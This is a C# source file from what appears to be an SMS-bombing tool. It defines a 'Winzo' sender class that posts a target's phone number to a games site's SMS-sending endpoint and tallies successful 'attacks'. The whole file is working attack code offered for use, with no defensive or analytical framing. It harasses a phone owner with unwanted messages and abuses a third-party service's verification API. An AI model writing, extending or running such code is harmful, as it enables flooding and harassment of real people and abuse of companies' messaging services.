using System;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class Winzo : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Winzo";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://www.winzogames.com/sendSms");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            { Content = new StringContent($"{{\"PHONE_NUMBER\":\"{To}\"}}", Encoding.UTF8, "application/json") };

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("{\"SUCCESS\":true}")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
